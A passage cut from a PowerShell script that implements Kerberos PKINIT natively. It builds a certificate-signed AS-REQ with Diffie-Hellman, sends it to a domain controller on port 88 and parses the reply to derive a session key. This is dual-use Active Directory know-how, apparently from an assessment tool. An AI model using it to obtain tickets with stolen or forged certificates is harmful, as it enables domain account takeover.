            $bytes[$byteLength - 1] = $bytes[$byteLength - 1] -band 0x7F

            # Convert to BigInteger (little-endian)
            return [System.Numerics.BigInteger]::new($bytes)
        }

        function ConvertTo-BigEndianBytes {
            [OutputType([byte[]])]
            param([System.Numerics.BigInteger]$Value, [int]$Length = 0)

            [byte[]]$bytes = $Value.ToByteArray()
            [Array]::Reverse($bytes)

            # Remove leading zeros
            $startIndex = 0
            while ($startIndex -lt $bytes.Length - 1 -and $bytes[$startIndex] -eq 0) {
                $startIndex++
            }

            if ($startIndex -gt 0) {
                # Create new byte array without leading zeros
                $newLength = $bytes.Length - $startIndex
                [byte[]]$trimmed = New-Object byte[] $newLength
                [Array]::Copy($bytes, $startIndex, $trimmed, 0, $newLength)
                $bytes = $trimmed
            }

            # Pad to specified length if needed
            if ($Length -gt 0 -and $bytes.Length -lt $Length) {
                [byte[]]$padded = New-Object byte[] $Length
                [Array]::Copy($bytes, 0, $padded, $Length - $bytes.Length, $bytes.Length)
                $bytes = $padded
            }

            # Use comma operator to prevent PowerShell from unrolling the byte array
            return ,$bytes
        }

        function New-DHKeyPair {
            # Generate private key (random number less than p-1)
            $privateKey = Get-RandomBigInteger -BitLength 256

            # Calculate public key: g^x mod p
            $publicKey = [System.Numerics.BigInteger]::ModPow(
                [System.Numerics.BigInteger]$DH_G,
                $privateKey,
                $DH_P
            )

            return @{
                PrivateKey = $privateKey
                PublicKey = $publicKey
            }
        }

        function Get-DHSharedSecret {
            param(
                [System.Numerics.BigInteger]$TheirPublicKey,
                [System.Numerics.BigInteger]$MyPrivateKey
            )

            # shared_secret = their_public ^ my_private mod p
            return [System.Numerics.BigInteger]::ModPow($TheirPublicKey, $MyPrivateKey, $DH_P)
        }

        function New-PKINITDHNonce {
            $nonce = New-Object byte[] 32
            $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
            $rng.GetBytes($nonce)
            $rng.Dispose()
            return $nonce
        }

        function Get-SHA1Hash {
            param([byte[]]$Data)
            $sha1 = [System.Security.Cryptography.SHA1]::Create()
            $hash = $sha1.ComputeHash($Data)
            $sha1.Dispose()
            return $hash
        }

        function Get-SHA256Hash {
            param([byte[]]$Data)
            $sha256 = [System.Security.Cryptography.SHA256]::Create()
            $hash = $sha256.ComputeHash($Data)
            $sha256.Dispose()
            return $hash
        }

        #region AS-REQ Building

        function New-PKAuthenticator {
            param(
                [int]$CuSec,
                [datetime]$CTime,
                [uint32]$Nonce,
                [byte[]]$PaChecksum,   # SHA1 of KDC-REQ-BODY (RFC 4556)
                [byte[]]$PaChecksum2   # SHA256 of KDC-REQ-BODY (MS-PKCA for Windows Server 2022+)
            )

            # PKAuthenticator ::= SEQUENCE {
            #     cusec          [0] INTEGER,
            #     ctime          [1] KerberosTime,
            #     nonce          [2] INTEGER,
            #     paChecksum     [3] OCTET STRING OPTIONAL,       -- SHA-1 (RFC 4556)
            #     ...,
            #     freshnessToken [4] OCTET STRING OPTIONAL,       -- RFC 8070 (not used here)
            #     paChecksum2    [5] PAChecksum2 OPTIONAL         -- MS-PKCA (Windows Server 2022+)
            # }
            #
            # PAChecksum2 ::= SEQUENCE {
            #     checksum            [0] OCTET STRING,           -- SHA-256 hash
            #     algorithmIdentifier [1] AlgorithmIdentifier     -- OID 2.16.840.1.101.3.4.2.1 (sha256)
            # }

            $data = @()

            # cusec [0] INTEGER
            $data += New-ASN1ContextTag -Tag 0 -Data (New-ASN1Integer -Value $CuSec)

            # ctime [1] KerberosTime (GeneralizedTime)
            $data += New-ASN1ContextTag -Tag 1 -Data (New-ASN1GeneralizedTime -Value $CTime)

            # nonce [2] INTEGER
            $data += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Nonce)

            # paChecksum [3] OCTET STRING (SHA-1)
            if ($PaChecksum) {
                $data += New-ASN1ContextTag -Tag 3 -Data (New-ASN1OctetString -Value $PaChecksum)
            }

            # freshnessToken [4] - not used, skip

            # paChecksum2 [5] PAChecksum2 (SHA-256 for Windows Server 2022+)
            if ($PaChecksum2) {
                # Build PAChecksum2 structure
                # PAChecksum2 ::= SEQUENCE {
                #     checksum            [0] OCTET STRING,
                #     algorithmIdentifier [1] AlgorithmIdentifier
                # }

                # AlgorithmIdentifier for SHA-256: OID 2.16.840.1.101.3.4.2.1
                $sha256Oid = New-ASN1ObjectIdentifier -OID "2.16.840.1.101.3.4.2.1"
                # AlgorithmIdentifier ::= SEQUENCE { algorithm OID, parameters ANY OPTIONAL }
                # For SHA-256, parameters is typically NULL or absent
                $algorithmId = New-ASN1Sequence -Data ($sha256Oid + (New-ASN1Null))

                $paChecksum2Content = @()
                # checksum [0] OCTET STRING
                $paChecksum2Content += New-ASN1ContextTag -Tag 0 -Data (New-ASN1OctetString -Value $PaChecksum2)
                # algorithmIdentifier [1] AlgorithmIdentifier
                $paChecksum2Content += New-ASN1ContextTag -Tag 1 -Data $algorithmId

                $paChecksum2Seq = New-ASN1Sequence -Data ([byte[]]$paChecksum2Content)

                # Wrap in context tag [5]
                $data += New-ASN1ContextTag -Tag 5 -Data $paChecksum2Seq
            }

            return New-ASN1Sequence -Data ([byte[]]$data)
        }

        function New-SubjectPublicKeyInfo {
            param(
                [System.Numerics.BigInteger]$DHPublicKey
            )

            # SubjectPublicKeyInfo ::= SEQUENCE {
            #     algorithm AlgorithmIdentifier,
            #     subjectPublicKey BIT STRING
            # }

            # AlgorithmIdentifier for DH
            # OID 1.2.840.10046.2.1 = dhpublicnumber
            $dhOid = New-ASN1ObjectIdentifier -OID "1.2.840.10046.2.1"

            # DomainParameters (p, g, q)
            # ValidationParms ::= SEQUENCE {
            #     seed        BIT STRING,
            #     pgenCounter INTEGER
            # }
            # DomainParameters ::= SEQUENCE {
            #     p INTEGER,
            #     g INTEGER,
            #     q INTEGER OPTIONAL
            # }

            $pBytes = ConvertTo-BigEndianBytes -Value $DH_P
            $pASN = New-ASN1Integer -Value $pBytes

            $gASN = New-ASN1Integer -Value $DH_G

            # q is (p-1)/2 for safe primes
            $q = ($DH_P - 1) / 2
            $qBytes = ConvertTo-BigEndianBytes -Value $q
            $qASN = New-ASN1Integer -Value $qBytes

            $domainParams = New-ASN1Sequence -Data ($pASN + $gASN + $qASN)

            $algorithmId = New-ASN1Sequence -Data ($dhOid + $domainParams)

            # Public key as INTEGER wrapped in BIT STRING
            $pubKeyBytes = ConvertTo-BigEndianBytes -Value $DHPublicKey
            $pubKeyASN = New-ASN1Integer -Value $pubKeyBytes
            $pubKeyBitString = New-ASN1BitString -Value $pubKeyASN -UnusedBits 0

            return New-ASN1Sequence -Data ($algorithmId + $pubKeyBitString)
        }

        function New-AuthPack {
            param(
                [byte[]]$PKAuthenticator,
                [byte[]]$ClientPublicValue,
                [byte[]]$ClientDHNonce
            )

            # AuthPack ::= SEQUENCE {
            #     pkAuthenticator     [0] PKAuthenticator,
            #     clientPublicValue   [1] SubjectPublicKeyInfo OPTIONAL,
            #     supportedCMSTypes   [2] SEQUENCE OF AlgorithmIdentifier OPTIONAL,
            #     clientDHNonce       [3] OCTET STRING OPTIONAL
            # }

            $data = @()

            # pkAuthenticator [0]
            $data += New-ASN1ContextTag -Tag 0 -Data $PKAuthenticator

            # clientPublicValue [1]
            if ($ClientPublicValue) {
                $data += New-ASN1ContextTag -Tag 1 -Data $ClientPublicValue
            }

            # supportedCMSTypes [2] - we'll skip this for simplicity

            # clientDHNonce [3]
            if ($ClientDHNonce) {
                $data += New-ASN1ContextTag -Tag 3 -Data (New-ASN1OctetString -Value $ClientDHNonce)
            }

            return New-ASN1Sequence -Data ([byte[]]$data)
        }

        function New-CMSSignedData {
            param(
                [byte[]]$ContentToSign,
                [System.Security.Cryptography.X509Certificates.X509Certificate2]$Certificate
            )

            # Use .NET SignedCms class for CMS/PKCS#7 signing
            Add-Type -AssemblyName System.Security

            # Note: Content MUST be valid DER-encoded ASN.1 for this OID to work
            $pkInitOid = New-Object System.Security.Cryptography.Oid("1.3.6.1.5.2.3.1")  # id-pkinit-authData
            $contentInfo = New-Object System.Security.Cryptography.Pkcs.ContentInfo(
                $pkInitOid,
                $ContentToSign
            )

            $signedCms = New-Object System.Security.Cryptography.Pkcs.SignedCms($contentInfo, $false)

            $signer = New-Object System.Security.Cryptography.Pkcs.CmsSigner($Certificate)
            $signer.IncludeOption = [System.Security.Cryptography.X509Certificates.X509IncludeOption]::EndCertOnly
            $signer.DigestAlgorithm = New-Object System.Security.Cryptography.Oid("2.16.840.1.101.3.4.2.1")  # SHA256

            $signedCms.ComputeSignature($signer)

            return $signedCms.Encode()
        }

        function New-PA_PK_AS_REQ {
            param(
                [byte[]]$SignedAuthPack
            )

            if (-not $SignedAuthPack -or $SignedAuthPack.Length -eq 0) {
                throw "SignedAuthPack is empty - cannot build PA-PK-AS-REQ"
            }

            # PA-PK-AS-REQ ::= SEQUENCE {
            #     signedAuthPack    [0] IMPLICIT OCTET STRING,
            #     trustedCertifiers [1] SEQUENCE OF ExternalPrincipalIdentifier OPTIONAL,  -- not used
            #     kdcPkId           [2] IMPLICIT OCTET STRING OPTIONAL                     -- not used
            # }

            # signedAuthPack [0] IMPLICIT OCTET STRING
            # Note: IMPLICIT means we use the context tag directly without wrapping in OCTET STRING tag
            $implicitTag = New-ASN1ContextTag -Tag 0 -Data $SignedAuthPack -Implicit

            return New-ASN1Sequence -Data ([byte[]]$implicitTag)
        }

        function New-KerberosASREQ {
            param(
                [string]$UserName,
                [string]$Realm,
                [byte[]]$PAData,
                [uint32]$Nonce,
                [switch]$NoPAC
            )

            # AS-REQ ::= [APPLICATION 10] KDC-REQ
            # KDC-REQ ::= SEQUENCE {
            #     pvno      [1] INTEGER (5),
            #     msg-type  [2] INTEGER (10 = AS-REQ),
            #     padata    [3] SEQUENCE OF PA-DATA OPTIONAL,
            #     req-body  [4] KDC-REQ-BODY
            # }

            $realmUpper = $Realm.ToUpper()

            # Build KDC-REQ-BODY first (needed for checksum)
            $kdcOptions = New-KerberosKDCOptions -Forwardable -Renewable -Canonicalize -RenewableOK

            # cname - client principal name
            $cname = New-KerberosPrincipalName -NameType $Script:NT_PRINCIPAL -NameStrings @($UserName)

            # sname - krbtgt/REALM
            $sname = New-KerberosPrincipalName -NameType $Script:NT_SRV_INST -NameStrings @("krbtgt", $realmUpper)

            # till - far future
            $till = [datetime]::new(2037, 9, 13, 2, 48, 5, [System.DateTimeKind]::Utc)

            # etype - supported encryption types (prefer AES)
            # Build etypes as concatenated byte array (not array of arrays)
            $etypesBytes = @()
            $etypesBytes += New-ASN1Integer -Value $Script:ETYPE_AES256_CTS_HMAC_SHA1
            $etypesBytes += New-ASN1Integer -Value $Script:ETYPE_AES128_CTS_HMAC_SHA1
            $etypesBytes += New-ASN1Integer -Value $Script:ETYPE_RC4_HMAC

            # KDC-REQ-BODY
            $reqBodyContent = @()

            # kdc-options [0]
            $reqBodyContent += New-ASN1ContextTag -Tag 0 -Data $kdcOptions

            # cname [1]
            $reqBodyContent += New-ASN1ContextTag -Tag 1 -Data $cname

            # realm [2]
            $reqBodyContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1GeneralString -Value $realmUpper)

            # sname [3]
            $reqBodyContent += New-ASN1ContextTag -Tag 3 -Data $sname

            # till [5]
            $reqBodyContent += New-ASN1ContextTag -Tag 5 -Data (New-ASN1GeneralizedTime -Value $till)

            # nonce [7]
            $reqBodyContent += New-ASN1ContextTag -Tag 7 -Data (New-ASN1Integer -Value $Nonce)

            # etype [8]
            $reqBodyContent += New-ASN1ContextTag -Tag 8 -Data (New-ASN1Sequence -Data ([byte[]]$etypesBytes))

            $reqBody = New-ASN1Sequence -Data ([byte[]]$reqBodyContent)

            # Build padata array
            $padataArray = @()

            # PA-PK-AS-REQ (only if PAData is provided - first call is just for checksum)
            if ($PAData -and $PAData.Length -gt 0) {
                $paPkAsReq = New-KerberosPAData -PADataType $Script:PA_PK_AS_REQ -PADataValue $PAData
                $padataArray += $paPkAsReq
            }

            # PA-PAC-REQUEST (include or exclude PAC)
            $pacRequest = if ($NoPAC) {
                New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $false))
            } else {
                New-ASN1Sequence -Data (New-ASN1ContextTag -Tag 0 -Data (New-ASN1Boolean -Value $true))
            }
            $paPacReq = New-KerberosPAData -PADataType $Script:PA_PAC_REQUEST -PADataValue $pacRequest
            $padataArray += $paPacReq

            $padata = New-ASN1Sequence -Data ([byte[]]$padataArray)

            # Build KDC-REQ
            $kdcReqContent = @()

            # pvno [1]
            $kdcReqContent += New-ASN1ContextTag -Tag 1 -Data (New-ASN1Integer -Value 5)

            # msg-type [2]
            $kdcReqContent += New-ASN1ContextTag -Tag 2 -Data (New-ASN1Integer -Value $Script:KRB_AS_REQ)

            # padata [3]
            $kdcReqContent += New-ASN1ContextTag -Tag 3 -Data $padata

            # req-body [4]
            $kdcReqContent += New-ASN1ContextTag -Tag 4 -Data $reqBody

            $kdcReq = New-ASN1Sequence -Data ([byte[]]$kdcReqContent)

            # Wrap in APPLICATION 10 tag
            $asReq = New-ASN1ApplicationTag -Tag 10 -Data $kdcReq

            return @{
                ASReq = $asReq
                ReqBody = $reqBody
            }
        }

        #endregion

        #region AS-REP Parsing

        function ConvertFrom-ASREP {
            param([byte[]]$Data)

            $result = @{
                Success = $false
                Error = $null
                Ticket = $null
                EncPart = $null
                PAData = @()
                EType = $null
            }

            try {
                # Read APPLICATION tag
                $root = Read-ASN1Element -Data $Data -Offset 0

                # Check for KRB-ERROR (APPLICATION 30)
                if (($root.Tag -band 0x1F) -eq 30) {
                    $result.Error = "KRB-ERROR received"
                    # Parse error details - try to extract error code
                    # KRB-ERROR structure: APPLICATION 30 -> SEQUENCE -> children
                    try {
                        # First child should be SEQUENCE containing all fields
                        $seqElement = Read-ASN1Element -Data $root.Content -Offset 0

                        # Parse children of the SEQUENCE
                        $children = Read-ASN1Children -Data $seqElement.Content
                        foreach ($child in $children) {
                            # CONTEXT tags have high bit set: [0]=0xA0, [6]=0xA6
                            $contextTag = $child.Tag -band 0x1F
                            if ($contextTag -eq 6) {  # error-code [6] INTEGER
                                try {
                                    $innerElem = Read-ASN1Element -Data $child.Content
                                    if ($innerElem.Content -and $innerElem.Content.Length -gt 0) {
                                        $errorCode = 0
                                        foreach ($b in $innerElem.Content) {
                                            $errorCode = ($errorCode -shl 8) -bor $b
                                        }
                                        # Use centralized Kerberos error code mapping
                                        $errorDesc = Get-KerberosErrorMessage -ErrorCode $errorCode
                                        $result.Error = "KRB-ERROR $errorCode`: $errorDesc"
                                    }
                                } catch {
                                    Write-Log "[ConvertFrom-ASREP] Failed to parse error code: $_"
                                }
                            }
                            elseif ($contextTag -eq 12) {  # e-text [12] GeneralString
                                try {
                                    $innerElem = Read-ASN1Element -Data $child.Content
                                    if ($innerElem.Content) {
                                        $etext = [System.Text.Encoding]::UTF8.GetString($innerElem.Content)
                                        # Clean e-text: remove non-printable characters
                                        $etext = $etext -replace '[^\x20-\x7E]', ''
                                        $etext = $etext.Trim()
                                        # Only append if e-text contains meaningful content (more than just single chars/digits)
                                        if ($etext -and $etext.Length -gt 2) {
                                            $result.Error += " - $etext"
                                        }
                                    }
                                } catch {
                                    Write-Log "[ConvertFrom-ASREP] Failed to parse e-text: $_"
                                }
                            }
                        }
                    } catch {
                        Write-Log "[ConvertFrom-ASREP] Failed to parse KRB-ERROR details: $_"
                    }
                    return $result
                }

                # Check for AS-REP (APPLICATION 11)
                if (($root.Tag -band 0x1F) -ne 11) {
                    $result.Error = "Unexpected response type: $($root.Tag)"
                    return $result
                }

                # Parse KDC-REP structure
                # AS-REP: [APPLICATION 11] -> SEQUENCE -> context-tagged fields
                # The root.Content starts with SEQUENCE, we need to parse inside it
                $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0

                $childrenData = if ($innerSeq.Tag -eq 0x30) {
                    # Inner is a SEQUENCE - parse its children
                    $innerSeq.Content
                } else {
                    # No inner SEQUENCE (shouldn't happen), try root content directly
                    $root.Content
                }

                $children = Read-ASN1Children -Data $childrenData

                foreach ($child in $children) {
                    switch ($child.TagNumber) {
                        # RFC 4120 AS-REP structure:
                        # [0] pvno INTEGER
                        # [1] msg-type INTEGER
                        # [2] padata SEQUENCE OF PA-DATA OPTIONAL
                        # [3] crealm Realm (GeneralString)
                        # [4] cname PrincipalName
                        # [5] ticket Ticket
                        # [6] enc-part EncryptedData
                        0 {  # pvno [0]
                            $pvnoElement = Read-ASN1Element -Data $child.Content
                            $pvno = Read-ASN1Integer -Content $pvnoElement.Content
                        }
                        1 {  # msg-type [1]
                            $msgTypeElement = Read-ASN1Element -Data $child.Content
                            $msgType = Read-ASN1Integer -Content $msgTypeElement.Content
                        }
                        2 {  # padata [2] SEQUENCE OF PA-DATA
                            try {
                                $padataSeq = Read-ASN1Element -Data $child.Content
                                $padataChildren = Read-ASN1Children -Data $padataSeq.Content

                                foreach ($pa in $padataChildren) {
                                    # Each PA-DATA is a SEQUENCE with padata-type [1] and padata-value [2]
                                    $paSeq = Read-ASN1Element -Data $pa.Content
                                    if ($paSeq.Tag -eq 0x30) {
                                        $paChildren = Read-ASN1Children -Data $paSeq.Content
                                    } else {
                                        $paChildren = Read-ASN1Children -Data $pa.Content
                                    }
                                    $paType = $null
                                    $paValue = $null

                                    foreach ($paChild in $paChildren) {
                                        if ($paChild.TagNumber -eq 1) {
                                            $paTypeElement = Read-ASN1Element -Data $paChild.Content
                                            $paType = Read-ASN1Integer -Content $paTypeElement.Content
                                        }
                                        elseif ($paChild.TagNumber -eq 2) {
                                            $paValueElement = Read-ASN1Element -Data $paChild.Content
                                            $paValue = $paValueElement.Content
                                        }
                                    }

                                    if ($null -ne $paType) {
                                        $result.PAData += @{
                                            Type = $paType
                                            Value = $paValue
                                        }
                                    }
                                }
                            } catch {
                                Write-Log "[ConvertFrom-ASREP] Error parsing padata: $_"
                            }
                        }
                        3 {  # crealm [3] Realm (GeneralString)
                            $crealmElement = Read-ASN1Element -Data $child.Content
                            $result.Realm = [System.Text.Encoding]::ASCII.GetString($crealmElement.Content)
                        }
                        4 {  # cname [4] PrincipalName - skip
                        }
                        5 {  # ticket [5]
                            $result.Ticket = $child.Content
                        }
                        6 {  # enc-part [6]
                            $encPartSeq = Read-ASN1Element -Data $child.Content
                            $encPartChildren = Read-ASN1Children -Data $encPartSeq.Content

                            foreach ($encChild in $encPartChildren) {
                                if ($encChild.TagNumber -eq 0) {  # etype
                                    $result.EType = Read-ASN1Integer -Content (Read-ASN1Element -Data $encChild.Content).Content
                                }
                                elseif ($encChild.TagNumber -eq 2) {  # cipher
                                    $result.EncPart = (Read-ASN1Element -Data $encChild.Content).Content
                                }
                            }
                        }
                    }
                }

                $result.Success = $true
            }
            catch {
                $result.Error = "Failed to parse AS-REP: $_"
            }

            return $result
        }

        function ConvertFrom-PaPkAsRep {
            param([byte[]]$Data)

            $result = @{
                Success = $false
                DHKeyInfo = $null
                ServerDHNonce = $null
            }

            try {
                # PA-PK-AS-REP ::= CHOICE {
                #     dhInfo        [0] DHRepInfo,
                #     encKeyPack    [1] IMPLICIT OCTET STRING
                # }

                $root = Read-ASN1Element -Data $Data -Offset 0

                if ($root.TagNumber -eq 0) {
                    # DHRepInfo - this is what we expect
                    # DHRepInfo ::= SEQUENCE {
                    #     dhSignedData    [0] IMPLICIT OCTET STRING,
                    #     serverDHNonce   [1] OCTET STRING OPTIONAL
                    # }

                    # The root content is the DHRepInfo SEQUENCE
                    $dhRepInfo = Read-ASN1Element -Data $root.Content
                    $dhChildren = Read-ASN1Children -Data $dhRepInfo.Content

                    foreach ($child in $dhChildren) {
                        if ($child.TagNumber -eq 0) {
                            # dhSignedData [0] IMPLICIT OCTET STRING
                            # IMPLICIT means the [0] tag REPLACES the OCTET STRING tag
                            # So the content IS the CMS SignedData directly
                            $result.DHSignedData = $child.Content
                        }
                        elseif ($child.TagNumber -eq 1) {
                            # serverDHNonce [1] OCTET STRING
                            $nonceElement = Read-ASN1Element -Data $child.Content
                            $result.ServerDHNonce = $nonceElement.Content
                        }
                    }

                    # Parse the CMS SignedData to get KDCDHKeyInfo
                    if ($result.DHSignedData) {
                        $result.DHKeyInfo = ConvertFrom-KDCDHKeyInfo -SignedData $result.DHSignedData
                    }

                    $result.Success = $true
                }
                elseif ($root.TagNumber -eq 1) {
                    # encKeyPack - RSA mode, not implemented
                    $result.Error = "RSA key encapsulation mode not supported"
                }
            }
            catch {
                $result.Error = "Failed to parse PA-PK-AS-REP: $_"
            }

            return $result
        }

        function ConvertFrom-KDCDHKeyInfo {
            param([byte[]]$SignedData)

            # Parse CMS SignedData to extract encapsulated content
            Add-Type -AssemblyName System.Security

            try {
                $signedCms = New-Object System.Security.Cryptography.Pkcs.SignedCms
                $signedCms.Decode($SignedData)

                # Get the content (KDCDHKeyInfo)
                $content = $signedCms.ContentInfo.Content

                # KDCDHKeyInfo ::= SEQUENCE {
                #     subjectPublicKey    [0] BIT STRING,
                #     nonce               [1] INTEGER,
                #     dhKeyExpiration     [2] KerberosTime OPTIONAL
                # }

                $keyInfo = Read-ASN1Element -Data $content
                $keyInfoChildren = Read-ASN1Children -Data $keyInfo.Content

                $result = @{
                    ServerPublicKey = $null
                    Nonce = $null
                }

                foreach ($child in $keyInfoChildren) {
                    if ($child.TagNumber -eq 0) {
                        # subjectPublicKey [0] - context tag wrapping BIT STRING
                        $bitStringElement = Read-ASN1Element -Data $child.Content

                        if ($bitStringElement.Tag -eq 0x03) {
                            # Proper BIT STRING - first byte is unused bits count
                            $bitStringData = $bitStringElement.Content[1..($bitStringElement.Content.Length - 1)]

                            # The BIT STRING contains an INTEGER (the DH public key)
                            $pubKeyInt = Read-ASN1Element -Data $bitStringData

                            # The content is the DH public key as INTEGER
                            $pubKeyBytes = $pubKeyInt.Content
                            # Remove leading zero if present (for positive numbers)
                            if ($pubKeyBytes[0] -eq 0x00 -and $pubKeyBytes.Length -gt 1) {
                                $pubKeyBytes = $pubKeyBytes[1..($pubKeyBytes.Length - 1)]
                            }

                            # Convert to BigInteger (big-endian input, so reverse for little-endian)
                            $pubKeyBytesLE = [byte[]]::new($pubKeyBytes.Length)
                            [Array]::Copy($pubKeyBytes, $pubKeyBytesLE, $pubKeyBytes.Length)
                            [Array]::Reverse($pubKeyBytesLE)
                            # Add zero byte if needed to ensure positive interpretation
                            if ($pubKeyBytesLE.Length -gt 0 -and ($pubKeyBytesLE[$pubKeyBytesLE.Length - 1] -band 0x80)) {
                                $pubKeyBytesLE = [byte[]]($pubKeyBytesLE + @([byte]0x00))
                            }
                            $result.ServerPublicKey = [System.Numerics.BigInteger]::new($pubKeyBytesLE)
                        }
                    }
                    elseif ($child.TagNumber -eq 1) {
                        # nonce [1]
                        $nonceElement = Read-ASN1Element -Data $child.Content
                        $result.Nonce = Read-ASN1Integer -Content $nonceElement.Content
                    }
                }

                return $result
            }
            catch {
                Write-Log "[ConvertFrom-KDCDHKeyInfo] Error parsing CMS: $_"
                return $null
            }
        }

        #endregion

        #region Key Derivation

        function Get-PKINITSessionKey {
            param(
                [byte[]]$SharedSecret,
                [byte[]]$ClientDHNonce,
                [byte[]]$ServerDHNonce,
                [int]$EType
            )

            # Key derivation as per RFC 4556 Section 3.2.3.1
            # octetstring2key(x) == random-to-key(K-truncate(
            #     SHA1(0x00 | x) | SHA1(0x01 | x) | SHA1(0x02 | x) | ...
            # ))
            # Where x = DHSharedSecret || n_c || n_k
            # n_c = clientDHNonce, n_k = serverDHNonce (when DH nonces are used)
            #
            # The counter (0x00, 0x01, etc.) is a single byte PREPENDED to x
            # NO "pkinit" constant - that was wrong!

            $keyMaterial = [byte[]]$SharedSecret + [byte[]]$ClientDHNonce + [byte[]]$ServerDHNonce

            $keyLength = switch ($EType) {
                $ETYPE_AES128_CTS { 16 }  # AES128
                $ETYPE_AES256_CTS { 32 }  # AES256
                $ETYPE_RC4_HMAC { 16 }    # RC4
                default { 16 }
            }

            $derivedKey = [System.Collections.Generic.List[byte]]::new()
            $counter = 0

            while ($derivedKey.Count -lt $keyLength) {
                # RFC 4556: SHA1(counter_byte | x) where counter starts at 0x00
                $toHash = [byte[]]@([byte]$counter) + $keyMaterial
                $hash = Get-SHA1Hash -Data $toHash
                foreach ($b in $hash) {
                    $derivedKey.Add($b)
                }
                $counter++
            }

            return [byte[]]$derivedKey.GetRange(0, $keyLength).ToArray()
        }

        function Unprotect-KerberosData {
            param(
                [byte[]]$CipherText,
                [byte[]]$Key,
                [int]$EType,
                [int]$KeyUsage
            )

            switch ($EType) {
                $ETYPE_RC4_HMAC {
                    # RC4-HMAC - use centralized function from Kerberos-Crypto.ps1
                    return Decrypt-RC4HMAC -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage
                }
                $ETYPE_AES128_CTS {
                    # AES128-CTS-HMAC-SHA1-96 - use centralized function from Kerberos-Crypto.ps1
                    return Decrypt-AESCTS -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage
                }
                $ETYPE_AES256_CTS {
                    # AES256-CTS-HMAC-SHA1-96 - use centralized function from Kerberos-Crypto.ps1
                    return Decrypt-AESCTS -Key $Key -CipherText $CipherText -KeyUsage $KeyUsage
                }
                default {
                    throw "Unsupported encryption type: $EType"
                }
            }
        }

        #endregion
    }

    process {
        try {
            # Step 1: Generate DH key pair
            $dhKeyPair = New-DHKeyPair

            # Step 2: Generate nonces
            $clientDHNonce = New-PKINITDHNonce
            $krbNonce = [uint32](Get-Random -Minimum 1 -Maximum 2147483647)

            # Step 3: Build AS-REQ body first (for checksum)

            # Temporary AS-REQ to get req-body for checksum
            $tempASReq = New-KerberosASREQ -UserName $UserName -Realm $Domain -PAData @() -Nonce $krbNonce -NoPAC:$NoPAC

            # Calculate both SHA-1 (RFC 4556) and SHA-256 (MS-PKCA for Windows Server 2022+) checksums
            $reqBodyChecksum = Get-SHA1Hash -Data $tempASReq.ReqBody
            $reqBodyChecksum256 = Get-SHA256Hash -Data $tempASReq.ReqBody

            # Step 4: Build PKAuthenticator with both paChecksum (SHA-1) and paChecksum2 (SHA-256)
            # paChecksum2 is required for Windows Server 2022+ to avoid KDC_ERR_PA_CHECKSUM_MUST_BE_INCLUDED (error 79)
            $now = [datetime]::UtcNow
            $cusec = $now.Millisecond * 1000
            $pkAuthenticator = New-PKAuthenticator -CuSec $cusec -CTime $now -Nonce $krbNonce -PaChecksum $reqBodyChecksum -PaChecksum2 $reqBodyChecksum256

            Write-Log "[Invoke-PKINITAuth-Native] PKAuthenticator built with paChecksum (SHA-1) and paChecksum2 (SHA-256)"

            # Step 5: Build SubjectPublicKeyInfo for DH
            $clientPublicKeyInfo = New-SubjectPublicKeyInfo -DHPublicKey $dhKeyPair.PublicKey

            # Step 6: Build AuthPack
            $authPack = New-AuthPack -PKAuthenticator $pkAuthenticator -ClientPublicValue $clientPublicKeyInfo -ClientDHNonce $clientDHNonce

            # Step 7: Sign AuthPack with certificate (CMS SignedData)
            if (-not $authPack -or $authPack.Length -eq 0) {
                throw "AuthPack is empty - cannot sign"
            }
            $signedAuthPack = New-CMSSignedData -ContentToSign $authPack -Certificate $Cert

            # Step 8: Build PA-PK-AS-REQ
            $paPkAsReq = New-PA_PK_AS_REQ -SignedAuthPack $signedAuthPack

            # Step 9: Build final AS-REQ with PA-DATA
            $asReqResult = New-KerberosASREQ -UserName $UserName -Realm $Domain -PAData $paPkAsReq -Nonce $krbNonce -NoPAC:$NoPAC
            $asReqBytes = $asReqResult.ASReq

            # Step 10: Send AS-REQ to KDC
            Write-Log "[Invoke-PKINITAuth-Native] Sending AS-REQ to $DomainController`:88..."

            $tcpClient = $null
            $stream = $null
            $responseBytes = $null

            try {
                $tcpClient = New-Object System.Net.Sockets.TcpClient
                $tcpClient.Connect($DomainController, 88)
                $stream = $tcpClient.GetStream()
                $stream.ReadTimeout = 30000
                $stream.WriteTimeout = 30000

                # Kerberos TCP format: 4-byte big-endian length prefix
                $lengthBytes = [System.BitConverter]::GetBytes([uint32]$asReqBytes.Length)
                [Array]::Reverse($lengthBytes)
                $stream.Write($lengthBytes, 0, 4)
                $stream.Write($asReqBytes, 0, $asReqBytes.Length)
                $stream.Flush()

                # Read response
                $responseLengthBytes = New-Object byte[] 4
                $stream.Read($responseLengthBytes, 0, 4) | Out-Null
                [Array]::Reverse($responseLengthBytes)
                $responseLength = [System.BitConverter]::ToUInt32($responseLengthBytes, 0)

                $responseBytes = New-Object byte[] $responseLength
                $bytesRead = 0
                while ($bytesRead -lt $responseLength) {
                    $bytesRead += $stream.Read($responseBytes, $bytesRead, $responseLength - $bytesRead)
                }

            }
            finally {
                # Ensure TCP resources are always cleaned up
                if ($stream) { try { $stream.Close() } catch { } }
                if ($tcpClient) { try { $tcpClient.Close() } catch { } }
            }

            # Step 11: Parse AS-REP
            $asRep = ConvertFrom-ASREP -Data $responseBytes

            if (-not $asRep.Success) {
                # Distinguish between KRB-ERROR and parsing failures
                if ($asRep.Error -match "^KRB-ERROR") {
                    throw $asRep.Error
                } else {
                    throw "Failed to parse KDC response: $($asRep.Error)"
                }
            }

            # Step 12: Find and parse PA-PK-AS-REP
            # Debug: Show all PA-DATA types received
            if ($asRep.PAData -and $asRep.PAData.Count -gt 0) {
                $paTypes = $asRep.PAData | ForEach-Object {
                    $paTypeName = switch ($_.Type) {
                        2   { "PA-ENC-TIMESTAMP" }
                        11  { "PA-ETYPE-INFO" }
                        16  { "PA-PK-AS-REQ" }
                        17  { "PA-PK-AS-REP" }
                        19  { "PA-ETYPE-INFO2" }
                        128 { "PA-PAC-REQUEST" }
                        133 { "PA-FX-COOKIE" }
                        134 { "PA-AUTHENTICATION-SET" }
                        135 { "PA-AUTH-SET-SELECTED" }
                        136 { "PA-FX-FAST" }
